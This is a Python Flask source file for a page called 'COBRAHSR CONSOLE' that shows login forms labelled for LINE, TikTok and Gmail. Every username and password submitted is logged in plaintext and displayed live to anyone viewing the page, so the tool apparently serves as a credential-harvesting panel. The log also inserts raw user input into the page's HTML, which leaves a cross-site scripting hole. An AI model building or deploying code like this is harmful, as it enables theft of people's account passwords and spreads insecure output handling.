from flask import Flask, request, jsonify
import sys, io, traceback
from datetime import datetime

app = Flask(__name__)
logs = []

HTML = """
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>COBRAHSR CONSOLE</title>
<style>
body{margin:0;background:#010409;color:white;font-family:monospace;display:flex;flex-direction:column;height:100vh}
.header{background:#161b22;padding:12px;color:#ffd700;font-weight:bold;text-align:center;border-bottom:1px solid #333}
.menu{display:flex;flex-wrap:wrap;gap:6px;padding:10px;background:#0e1525}
.menu button{flex:1 0 30%;background:#161b22;border:1px solid #ffd700;color:#ffd700;padding:12px;font-weight:bold;border-radius:6px;cursor:pointer}
.menu button:hover{background:#ffd700;color:black}
.box{padding:15px}
input{width:100%;padding:12px;margin:6px 0;background:#010409;border:1px solid #333;color:#00ff88;border-radius:6px;outline:none}
.btn-run{width:100%;background:#ffd700;color:black;border:none;padding:14px;font-weight:bold;border-radius:6px;margin-top:8px;cursor:pointer}
.log{background:#0e1525;border-top:2px solid #ffd700;padding:10px;flex:1;overflow:auto}
.log-entry{border-bottom:1px solid #222;padding:6px 0;font-size:13px;color:#8b949e}
.log-entry b{color:#00ff88}
#formArea{display:none}
@media(min-width:768px){.main{display:flex;flex-direction:row;height:70vh}.left{width:50%}.right{width:50%;border-left:2px solid #ffd700}}
</style>
</head>
<body>
<div class="header">COBRAHSR CONSOLE - MENU COBRA</div>
<div class="main">
<div class="left">
<div class="menu">
<button onclick="openForm('1 - LOGIN COBRA')">1=LOGIN COBRA</button>
<button onclick="openForm('2 - REGISTRO COBRA')">2=REGISTRO</button>
<button onclick="openForm('3 - LINE COBRA')">3=LINE COBRA</button>
<button onclick="openForm('4 - TIKTOK COBRA')">4=TIKTOK COBRA</button>
<button onclick="openForm('5 - GMAIL COBRA')">5=MAIL COBRA</button>
<button onclick="salir()">6=SALIR</button>
</div>
<div class="box" id="formArea">
<h3 id="formTitle" style="color:#ffd700"></h3>
<input id="user" placeholder="Usuario / Email">
<input id="pass" type="password" placeholder="Contraseña">
<button class="btn-run" onclick="enviar()">▶ ENTRAR</button>
</div>
</div>
<div class="right log" id="log">
<div style="color:#ffd700;font-weight:bold">▼ INTERACTUANDO EN VIVO ▼</div>
<div id="logs"></div>
</div>
</div>

<script>
let moduloActual = "";
function openForm(mod){
  moduloActual = mod;
  document.getElementById('formArea').style.display='block';
  document.getElementById('formTitle').innerText = mod + ' - INICIAR SESION';
  addLog('Usuario abrio ' + mod);
}
function salir(){
  document.getElementById('formArea').style.display='none';
  addLog('Usuario selecciono SALIR');
}
async function enviar(){
  let u = document.getElementById('user').value;
  let p = document.getElementById('pass').value;
  if(!u||!p){alert('Llena usuario y contraseña');return}
  let res = await fetch('/login', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({modulo: moduloActual, user: u, pass: p})});
  let data = await res.json();
  document.getElementById('logs').innerHTML = data.html;
  document.getElementById('user').value='';
  document.getElementById('pass').value='';
}
function addLog(txt){
  fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({txt})});
}
setInterval(async ()=>{
  let r = await fetch('/getlogs');
  let d = await r.json();
  document.getElementById('logs').innerHTML = d.html;
}, 2000);
</script>
</body>
</html>
"""

@app.route('/')
def home():
    return HTML

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    hora = datetime.now().strftime("%H:%M:%S")
    entry = f"[{hora}] {data['modulo']} -> Usuario: {data['user']} | Contraseña: {data['pass']}"
    logs.append(entry)
    if len(logs) > 50: logs.pop(0)
    html = "".join([f"<div class='log-entry'><b>{l}</b></div>" for l in reversed(logs)])
    return jsonify({"html": html})

@app.route('/log', methods=['POST'])
def log():
    txt = request.json.get('txt','')
    hora = datetime.now().strftime("%H:%M:%S")
    logs.append(f"[{hora}] {txt}")
    return jsonify({"ok":True})

@app.route('/getlogs')
def getlogs():
    html = "".join([f"<div class='log-entry'><b>{l}</b></div>" for l in reversed(logs)])
    if not html:
        html = "<div class='log-entry'>Esperando interacciones...</div>"
    return jsonify({"html": html})

if __name__ == '__main__':
    app.run()